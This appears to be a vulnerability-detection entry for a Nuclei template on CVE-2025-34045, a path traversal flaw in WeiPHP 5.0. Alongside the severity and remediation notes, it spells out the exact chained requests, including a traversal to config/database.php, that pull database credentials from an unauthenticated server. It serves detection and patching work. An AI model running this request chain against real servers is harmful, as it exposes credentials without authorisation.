---
cve_id: CVE-2025-34045
template_path: nuclei-templates/http/cves/2025/CVE-2025-34045.yaml
affected_product: WeiPHP
severity: high
authentication: none
external_callback: false
affected_versions: 5.0
preconditions: []
poc_classification: info-leak
---

## Vulnerability
WeiPHP 5.0 contains a path traversal vulnerability (CWE-22) caused by insufficient input validation of the `picUrl` parameter in `/public/index.php/material/Material/_download_imgage`. Unauthenticated remote attackers can read arbitrary files on the server, including database configuration files containing sensitive credentials.

CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N (score 8.6).  
Impact: Exposure of DB credentials and other secrets.  
Remediation: Upgrade to WeiPHP 5.1 or later with proper file-path validation in the Material API.

## PoC / Detection
Classification: info-leak

The template actively exploits the flaw with a chained HTTP flow:  
- POST `/public/index.php/material/Material/_download_imgage?media_id=1&picUrl=./../config/database.php` (body: `"1":1`) to trigger traversal and force the server to process the config file into the upload directory.  
- GET `/public/index.php/home/file/user_pics` to locate the resulting JPG via regex extraction of `/public/uploads/picture/(.*.jpg)`.  
- GET the extracted endpoint and confirm success when the response body simultaneously contains `https://weiphp.cn`, `WeiPHP`, and `DB_PREFIX`.

## References
- http://wiki.peiqi.tech/PeiQi_Wiki/CMS%E6%BC%8F%E6%B4%9E/Weiphp/Weiphp5.0%20%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96%20CNVD-2020-68596.html
- https://vulncheck.com/advisories/weiphp-path-traversal-file-read
